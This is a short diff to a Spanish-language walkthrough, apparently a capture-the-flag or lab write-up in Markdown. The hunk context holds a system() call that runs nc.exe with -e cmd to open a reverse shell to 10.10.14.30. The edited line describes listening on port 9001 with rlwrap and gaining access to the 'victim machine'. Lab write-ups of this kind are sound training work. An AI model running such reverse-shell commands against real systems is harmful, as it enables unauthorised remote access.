@@ -353,5 +353,5 @@ system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.30 
 ![[Pasted image 20240520173557.png]]
 
 `rlwrap`
-estaremos a la escucha por el puerto 9001 enviamos
+estaremos a la escucha por el puerto 9001 enviamos nuevamente la petición y de esta manera logramos la intrusión a la maquina victima y arriba observamos la peticion a nuestro servidor con un estado `200`
 ![[Pasted image 20240520173809.png]]
